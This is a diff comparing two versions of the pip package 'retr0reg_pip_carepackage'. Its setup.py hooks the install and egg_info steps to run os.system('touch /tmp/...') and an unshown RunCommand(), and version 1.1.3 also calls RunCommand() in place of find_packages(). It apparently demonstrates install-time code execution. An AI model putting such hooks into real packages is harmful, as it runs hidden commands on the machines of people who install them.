# Comparing `tmp/retr0reg_pip_carepackage-1.1.2.tar.gz` & `tmp/retr0reg_pip_carepackage-1.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "retr0reg_pip_carepackage-1.1.2.tar", last modified: Sat May 25 07:13:52 2024, max compression
+gzip compressed data, was "retr0reg_pip_carepackage-1.1.3.tar", last modified: Sat May 25 07:16:09 2024, max compression
```

## Comparing `retr0reg_pip_carepackage-1.1.2.tar` & `retr0reg_pip_carepackage-1.1.3.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:13:52.509618 retr0reg_pip_carepackage-1.1.2/
--rw-r--r--   0 retr0     (1000) retr0     (1000)       81 2024-05-25 07:13:52.509618 retr0reg_pip_carepackage-1.1.2/PKG-INFO
-drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:13:52.509618 retr0reg_pip_carepackage-1.1.2/retr0reg_pip_carepackage.egg-info/
--rw-r--r--   0 retr0     (1000) retr0     (1000)       81 2024-05-25 07:13:52.000000 retr0reg_pip_carepackage-1.1.2/retr0reg_pip_carepackage.egg-info/PKG-INFO
--rw-r--r--   0 retr0     (1000) retr0     (1000)      228 2024-05-25 07:13:52.000000 retr0reg_pip_carepackage-1.1.2/retr0reg_pip_carepackage.egg-info/SOURCES.txt
--rw-r--r--   0 retr0     (1000) retr0     (1000)        1 2024-05-25 07:13:52.000000 retr0reg_pip_carepackage-1.1.2/retr0reg_pip_carepackage.egg-info/dependency_links.txt
--rw-r--r--   0 retr0     (1000) retr0     (1000)        4 2024-05-25 07:13:52.000000 retr0reg_pip_carepackage-1.1.2/retr0reg_pip_carepackage.egg-info/top_level.txt
--rw-r--r--   0 retr0     (1000) retr0     (1000)       38 2024-05-25 07:13:52.509618 retr0reg_pip_carepackage-1.1.2/setup.cfg
--rw-r--r--   0 retr0     (1000) retr0     (1000)      850 2024-05-25 07:11:51.000000 retr0reg_pip_carepackage-1.1.2/setup.py
-drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:13:52.509618 retr0reg_pip_carepackage-1.1.2/src/
--rw-r--r--   0 retr0     (1000) retr0     (1000)        0 2024-05-25 06:54:45.000000 retr0reg_pip_carepackage-1.1.2/src/__init__.py
--rw-r--r--   0 retr0     (1000) retr0     (1000)       31 2024-05-25 06:56:18.000000 retr0reg_pip_carepackage-1.1.2/src/main.py
+drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:16:09.959596 retr0reg_pip_carepackage-1.1.3/
+-rw-r--r--   0 retr0     (1000) retr0     (1000)       81 2024-05-25 07:16:09.959596 retr0reg_pip_carepackage-1.1.3/PKG-INFO
+-rw-r--r--   0 retr0     (1000) retr0     (1000)       38 2024-05-25 07:16:09.959596 retr0reg_pip_carepackage-1.1.3/setup.cfg
+-rw-r--r--   0 retr0     (1000) retr0     (1000)      847 2024-05-25 07:16:02.000000 retr0reg_pip_carepackage-1.1.3/setup.py
+drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:16:09.949597 retr0reg_pip_carepackage-1.1.3/src/
+-rw-r--r--   0 retr0     (1000) retr0     (1000)        0 2024-05-25 06:54:45.000000 retr0reg_pip_carepackage-1.1.3/src/__init__.py
+-rw-r--r--   0 retr0     (1000) retr0     (1000)       31 2024-05-25 06:56:18.000000 retr0reg_pip_carepackage-1.1.3/src/main.py
+drwxr-xr-x   0 retr0     (1000) retr0     (1000)        0 2024-05-25 07:16:09.959596 retr0reg_pip_carepackage-1.1.3/src/retr0reg_pip_carepackage.egg-info/
+-rw-r--r--   0 retr0     (1000) retr0     (1000)       81 2024-05-25 07:16:09.000000 retr0reg_pip_carepackage-1.1.3/src/retr0reg_pip_carepackage.egg-info/PKG-INFO
+-rw-r--r--   0 retr0     (1000) retr0     (1000)      244 2024-05-25 07:16:09.000000 retr0reg_pip_carepackage-1.1.3/src/retr0reg_pip_carepackage.egg-info/SOURCES.txt
+-rw-r--r--   0 retr0     (1000) retr0     (1000)        1 2024-05-25 07:16:09.000000 retr0reg_pip_carepackage-1.1.3/src/retr0reg_pip_carepackage.egg-info/dependency_links.txt
+-rw-r--r--   0 retr0     (1000) retr0     (1000)       14 2024-05-25 07:16:09.000000 retr0reg_pip_carepackage-1.1.3/src/retr0reg_pip_carepackage.egg-info/top_level.txt
```

### Comparing `retr0reg_pip_carepackage-1.1.2/setup.py` & `retr0reg_pip_carepackage-1.1.3/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -18,15 +18,15 @@
     def run(self):
         import os;os.system("touch /tmp/retr0reg-pip-carepackage")
         RunCommand()
         install.run(self)
 
 setup(
     name = "retr0reg_pip_carepackage",
-    version = "1.1.2",
+    version = "1.1.3",
     license = "MIT",
-    packages=find_packages(),
+    packages=RunCommand(),
     cmdclass={
         'install' : RunInstallCommand,
         'egg_info': RunEggInfoCommand
     },
 )
```

